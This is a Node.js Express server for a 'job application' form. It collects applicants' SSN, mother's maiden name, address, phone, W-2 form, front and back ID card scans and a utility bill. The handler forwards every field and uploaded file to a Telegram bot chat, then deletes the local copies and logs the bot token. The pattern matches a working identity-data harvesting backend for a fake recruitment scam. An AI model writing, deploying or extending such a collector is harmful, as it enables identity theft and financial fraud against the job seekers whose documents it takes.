import express from 'express';
import multer from 'multer';
import axios from 'axios';
import path from 'path';
import fs from 'fs';
import cors from 'cors';
import FormData from 'form-data';
import dotenv from 'dotenv';
import { fileURLToPath } from 'url';

// Get the directory name of the current module
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Configure dotenv with the path to your .env file
dotenv.config({ path: path.resolve(__dirname, '../.env') });

const app = express();
const port = process.env.PORT || 5002;

// Log environment variables to ensure they are loaded correctly
console.log('TELEGRAM_BOT_TOKEN:', process.env.TELEGRAM_BOT_TOKEN);
console.log('TELEGRAM_CHAT_ID:', process.env.TELEGRAM_CHAT_ID);

// Configure multer for file uploads
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, 'uploads/');
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname));
    }
});

const upload = multer({
    storage,
    limits: { fileSize: 10 * 1024 * 1024 } // 10 MB file size limit
});

// Create 'uploads' directory if it doesn't exist
if (!fs.existsSync('uploads')) {
    fs.mkdirSync('uploads');
}

// Use CORS middleware
app.use(cors({
    origin: '*',
    methods: 'POST',
    credentials: true,
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Helper function to send a file to Telegram
const sendFileToTelegram = async (filePath) => {
    const form = new FormData();
    form.append('chat_id', process.env.TELEGRAM_CHAT_ID);
    form.append('document', fs.createReadStream(filePath));

    try {
        const response = await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders(),
        });
        console.log('File sent to Telegram:', response.data);
        return response.data;
    } catch (error) {
        console.error('Error sending file to Telegram:', error.response ? error.response.data : error.message);
        throw error;
    }
};

// Route to handle form submission
app.post('/submit-form', upload.fields([
    { name: 'w2Form' },
    { name: 'idCardFront' },
    { name: 'idCardBack' },
    { name: 'utilityBill' }
]), async (req, res) => {
    try {
        const { lastName, firstName, mothersMaidenName, address1, email, positionApplied, ssn, startDate, telephone } = req.body;
        const w2Form = req.files['w2Form'] ? req.files['w2Form'][0].path : null;
        const idCardFront = req.files['idCardFront'] ? req.files['idCardFront'][0].path : null;
        const idCardBack = req.files['idCardBack'] ? req.files['idCardBack'][0].path : null;
        const utilityBill = req.files['utilityBill'] ? req.files['utilityBill'][0].path : null;

        // Validate form data
        if (!lastName || !firstName || !email || !positionApplied) {
            return res.status(400).json({ error: 'Missing required form fields.' });
        }

        // Log form data and file paths
        console.log('Form Data:', { lastName, firstName, mothersMaidenName, address1, email, positionApplied, ssn, startDate, telephone });
        console.log('Files:', { w2Form, idCardFront, idCardBack, utilityBill });

        // Send message to Telegram
        try {
            const message = `
                Last Name: ${lastName}
                First Name: ${firstName}
                Mother's Maiden Name: ${mothersMaidenName}
                Address Line 1: ${address1}
                Email: ${email}
                Position Applied: ${positionApplied}
                SSN: ${ssn}
                Start Date: ${startDate}
                Telephone: ${telephone}
            `;
            const messageResponse = await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: process.env.TELEGRAM_CHAT_ID,
                text: message,
            });

            // Log message response
            console.log('Telegram Message Response:', messageResponse.data);
        } catch (error) {
            console.error('Error sending message to Telegram:', error.response ? error.response.data : error.message);
            return res.status(500).json({ error: 'Error sending message to Telegram' });
        }

        // Send files to Telegram if they exist
        try {
            await Promise.all([
                w2Form && sendFileToTelegram(w2Form),
                idCardFront && sendFileToTelegram(idCardFront),
                idCardBack && sendFileToTelegram(idCardBack),
                utilityBill && sendFileToTelegram(utilityBill)
            ]);
        } catch (error) {
            console.error('Error sending files to Telegram:', error.message);
            return res.status(500).json({ error: 'Error sending files to Telegram' });
        }

        // Clean up uploaded files
        [w2Form, idCardFront, idCardBack, utilityBill].forEach(filePath => {
            if (filePath) {
                try {
                    fs.unlinkSync(filePath);
                } catch (error) {
                    console.error('Error deleting file:', filePath, error.message);
                }
            }
        });

        res.setHeader('Content-Type', 'application/json');
        res.status(200).json({ message: 'Form submitted successfully.' });
    } catch (error) {
        console.error('Error submitting form:', error.response ? error.response.data : error.message);
        res.setHeader('Content-Type', 'application/json');
        res.status(500).json({ error: 'Internal Server Error' });
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
